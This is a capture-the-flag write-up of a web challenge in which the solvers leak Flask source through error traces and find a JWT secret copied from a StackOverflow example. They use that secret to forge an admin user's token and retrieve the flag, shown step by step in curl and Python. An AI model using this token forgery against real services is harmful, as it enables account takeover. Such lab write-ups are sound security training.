# REdQueen
* Category: Web
* 400 Points
* Solved by the JCTF Team

## Description

> Revolution is about to start
> Enter! take a part
> Do you ready to test what is within your heart?
> 
> Quenched in the search of knowing
> Under the path you should not be slowing
> Elders know, but they are toying
> Entrusted with the glowing
> Ninjas are left for coding

## Solution

We visit the attached website and get a login screen:

```html
<form class="login100-form validate-form">
    <span class="login100-form-title">
    Member Login
    </span>
    <div class="wrap-input100 validate-input">
        <input id="username" class="input100" type="text" name="text" placeholder="Username">
        <span class="focus-input100"></span>
        <span class="symbol-input100">
        <i class="fa fa-user" aria-hidden="true"></i>
        </span>
    </div>
    <div class="wrap-input100 validate-input" data-validate="Password is required">
        <input id="password" class="input100" type="password" name="pass" placeholder="Password">
        <span class="focus-input100"></span>
        <span class="symbol-input100">
        <i class="fa fa-lock" aria-hidden="true"></i>
        </span>
    </div>

    <div class="container-login100-form-btn">
        <button id="loginbtn" class="login100-form-btn">
        Login
        </button>
    </div>
    <div class="text-center p-t-12">
        <span class="txt1">
        Forgot
        </span>
        <a class="txt2" href="/forgot">
        Username / Password?
        </a>
    </div>
    <div class="text-center p-t-136">
        <a class="txt2" href="/CreateAccount">
        Create your Account
        <i class="fa fa-long-arrow-right m-l-5" aria-hidden="true"></i>
        </a>
    </div>
</form>
```

We can register:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/REdQueen]
└─$ curl 'https://redqueen.intent.ctf.today/api/register' -X POST -H 'Content-Type: application/json' -b cookie.txt -c cookie.txt --data-raw '{"username":"user3","password":"password3"}'
{
  "message": "",
  "status": 1
}
```

Then use the credentials to login:

```console
┌──(user@kali)-[~/utils/web/jwt_tool]
└─$ curl 'https://redqueen.intent.ctf.today/api/login' -X POST -H 'Content-Type: application/json' -b cookie.txt -c cookie.txt --data-raw '{"username":"user3","password":"password3"}'
{
  "status": 1,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiJhOWIzMzNiYS0wMWY4LTQ0MzQtOTgxNy01MzNmYzM5N2EyNzMiLCJ1c2VybmFtZSI6InVzZXIzIiwiZXhwIjoxNjcxMjE5NDc4fQ.JYVA-cZ38hCo8ipr0M6f48a6FCP-DLwpIFN3zra2OoM"
}
```

Once we're logged in, the Red Queen challenges us:

```
RedQueen
Username

A dark secret is kept safe
Only one user holds it
Will you be the one to guess?
```

We also get a search box to search for text within the Alice in Wonderland book:

```html
<p class="text-center">Hello user3,<br/>Here is a search engine for the book - Alice in Wonderland.<br/>Use it, and you might find some secrets in it:</p>
<br/>
<div class="wrap-input100 validate-input">
    <input id="patternInput" class="input100" type="text" name="text" placeholder="Regex pattern" value="Alice">
    <span class="focus-input100"></span>
    <span class="symbol-input100">
        <i class="fa fa-search"></i>
    </span>
</div>
```

Let's test it:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/REdQueen]
└─$ curl 'https://redqueen.intent.ctf.today/api/RegexSearch' -X POST -H 'Content-Type: application/json' -b cookie.txt -
c cookie.txt --data-raw '{"pattern":"test"}'
{
  "results": [
    "  `I haven't the slightest idea,' said the Hatter."
  ]
}
```

Can we really use regex?

```console
┌──(user@kali)-[/media/sf_CTFs/intent/REdQueen]
└─$ curl 'https://redqueen.intent.ctf.today/api/RegexSearch' -X POST -H 'Content-Type: application/json' -b cookie.txt -c cookie.txt --data-raw '{"pattern":"te.t"}'
{
  "results": [
    "  `Are you content now?' said the Caterpillar.",
    "  `I haven't the slightest idea,' said the Hatter."
  ]
}
```

So a pattern such as `.*` might reveal the whole text:

```
┌──(user@kali)-[/media/sf_CTFs/intent/REdQueen]
└─$ curl 'https://redqueen.intent.ctf.today/api/RegexSearch' -X POST -H 'Content-Type: application/json' -b cookie.txt -c cookie.txt --data-raw '{"pattern":".*"}' -s | head
{
  "results": [
    "Alice's Adventures in Wonderland\n",
    "\n                ALICE'S ADVENTURES IN WONDERLAND",
    "\n",
    "\n                          Lewis Carroll",
    "\n",
    "\n               THE MILLENNIUM FULCRUM EDITION 3.0",
    "\n",
    "\n",
┌──(user@kali)-[/media/sf_CTFs/intent/REdQueen]
└─$ curl 'https://redqueen.intent.ctf.today/api/RegexSearch' -X POST -H 'Content-Type: application/json' -b cookie.txt -c cookie.txt --data-raw '{"pattern":".*"}' -s | tail
    "\nloving heart of her childhood:  and how she would gather about",
    "\nher other little children, and make THEIR eyes bright and eager",
    "\nwith many a strange tale, perhaps even with the dream of",
    "\nWonderland of long ago:  and how she would feel with all their",
    "\nsimple sorrows, and find a pleasure in all their simple joys,",
    "\nremembering her own child-life, and the happy summer days.",
    "\n",
    "\n                             THE END"
  ]
}
```

If we compare the output to copies of Alice in Wonderland that can be found online, we'll find that they are 1:1 binary identical, so no secret is hiding there. This leads us to try and attack the website API itself by sending malformed requests.


If we call the register endpoint without a password, we get an error which leaks part of the code:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/REdQueen]
└─$ curl 'https://redqueen.intent.ctf.today/api/register' -X POST -H 'Content-Type: application/json' -b cookie.txt -c cookie.txt --data-raw '{"username":""}' -s
```

Results in:

```
File "/usr/src/app/main.py", line 58, in signup_user

@app.route('/api/register', methods=['POST'])
def signup_user():
    data = request.get_json()
    hashed_password = generate_password_hash(data['password'], method='sha256')

    new_user = Users(public_id=str(uuid.uuid4()), username=data['username'], password=hashed_password, admin=False)

    is_user_exists_already = Users.query.filter_by(username=new_user.username).first()
    if is_user_exists_already is not None:
        return jsonify({'status': 0, 'message': "User already exists!"})

KeyError: 'password' 
```

Or, search for an invalid regex pattern:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/REdQueen]
└─$ curl 'https://redqueen.intent.ctf.today/api/RegexSearch' -X POST -H 'Content-Type: application/json' -b cookie.txt -c cookie.txt --data-raw '{"pattern":"*"}' -s
```

The exception we get is:

```
File "/usr/src/app/main.py", line 100, in regex_search

        print("pattern in json_body")
        print(regex_pattern)

    if regex_pattern is not None:
        with open(os.path.join(RUNNING_FOLDER, "alice_in_wonderland.txt"), "r") as fi:
            alice_textbook = fi.read()
            res = re.findall(f".*{regex_pattern}[,\\ .|\\s].*", alice_textbook, flags=re.IGNORECASE)
    return jsonify({'results': res})

# Based on https://stackoverflow.com/questions/66617043/flask-rest-api-typeerror
def token_required(f):
```

What's that StackOverflow reference? 

```python
from flask import Flask, request, jsonify, make_response
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
import uuid
import jwt
import datetime
from functools import wraps

app = Flask(__name__)

app.config['SECRET_KEY'] = 'Th1s1ss3cr3t'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///library.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True

db = SQLAlchemy(app)


class Users(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    public_id = db.Column(db.Integer)
    name = db.Column(db.String(50))
    password = db.Column(db.String(50))
    admin = db.Column(db.Boolean)


class Authors(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(50), unique=True, nullable=False)
    book = db.Column(db.String(20), unique=True, nullable=False)
    country = db.Column(db.String(50), nullable=False)
    booker_prize = db.Column(db.Boolean)
    user_id = db.Column(db.Integer)


def token_required(f):
    @wraps(f)
    def decorator(*args, **kwargs):

        token = None

        if 'x-access-tokens' in request.headers:
            token = request.headers['x-access-tokens']

        if not token:
            return jsonify({'message': 'a valid token is missing'})

        try:
            data = jwt.decode(token, app.config[SECRET_KEY])
            current_user = Users.query.filter_by(public_id=data['public_id']).first()
        except:
            return jsonify({'message': 'token is invalid'})

            return f(current_user, *args, **kwargs)

    return decorator


@app.route('/register', methods=['GET', 'POST'])
def signup_user():
    data = request.get_json()

    hashed_password = generate_password_hash(data['password'], method='sha256')

    new_user = Users(public_id=str(uuid.uuid4()), name=data['name'], password=hashed_password, admin=False)
    db.session.add(new_user)
    db.session.commit()

    return jsonify({'message': 'registered successfully'})
```

You must admit that the code that we leaked looks too similar to this StackOverflow reference. Is it possible that the `SECRET_KEY` was also reused?

```python
app.config['SECRET_KEY'] = 'Th1s1ss3cr3t'
```

Let's try to verify this, first by trying to decode the JWT with a fake key, then using the suspected one:

```python
>>> import jwt
>>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiJhOWIzMzNiYS0wMWY4LTQ0MzQtOTgxNy01MzNmYzM5N2EyNzMiLCJ1c2VybmFtZSI6InVzZXIzIiwiZXhwIjoxNjcxMjE5NDc4fQ.JYVA-cZ38h
... Co8ipr0M6f48a6FCP-DLwpIFN3zra2OoM"
>>> data = jwt.decode(token, "fakeKey", algorithms="HS256")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/home/user/.local/lib/python3.10/site-packages/jwt/api_jwt.py", line 168, in decode
    decoded = self.decode_complete(
  File "/home/user/.local/lib/python3.10/site-packages/jwt/api_jwt.py", line 120, in decode_complete
    decoded = api_jws.decode_complete(
  File "/home/user/.local/lib/python3.10/site-packages/jwt/api_jws.py", line 202, in decode_complete
    self._verify_signature(signing_input, header, signature, key, algorithms)
  File "/home/user/.local/lib/python3.10/site-packages/jwt/api_jws.py", line 301, in _verify_signature
    raise InvalidSignatureError("Signature verification failed")
jwt.exceptions.InvalidSignatureError: Signature verification failed

Signature verification failed
>>> data = jwt.decode(token, "Th1s1ss3cr3t", algorithms="HS256")
>>> data
{'public_id': 'a9b333ba-01f8-4434-9817-533fc397a273', 'username': 'user3', 'exp': 1671219478}

>>>
```

It works! Which means that we can try to login as a different user. Which user? How about `RedQueen` from before?

```python
>>> data["username"] = "RedQueen"
>>> encoded = jwt.encode(data, "Th1s1ss3cr3t", algorithm="HS256")
>>> encoded
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiJhOWIzMzNiYS0wMWY4LTQ0MzQtOTgxNy01MzNmYzM5N2EyNzMiLCJ1c2VybmFtZSI6IlJlZFF1ZWVuIiwiZXhwIjoxNjcxMjE5NDc4fQ.N8Axj7taXH0zUMI1nUvT35FhphIvMj9Ea-xSyBzTa4Q'
```

We use this token to fetch the home page and get the flag:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/REdQueen]
└─$ curl 'https://redqueen.intent.ctf.today/home' -H 'Cookie: loginToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdWJsaWNfaWQiOiJhOWIzMzNiYS0wMWY4LTQ0MzQtOTgxNy01MzNmYzM5N2EyNzMiLCJ1c2VybmFtZSI6IlJlZFF1ZWVuIiwiZXhwIjoxNjcxMjE5NDc4fQ.N8Axj7taXH0zUMI1nUvT35FhphIvMj9Ea-xSyBzTa4Q; intent-session=57ba9ed9f1a7d3d960143325b18d935e|29c10b2a403876fa3e4afe21f6464b04' -s | grep FLAG
                 <h1>FLAG - INTENT{PR0B4BLY-W3-N33D-4-N3W-53CR37-MY-M4J357Y} </h1>
```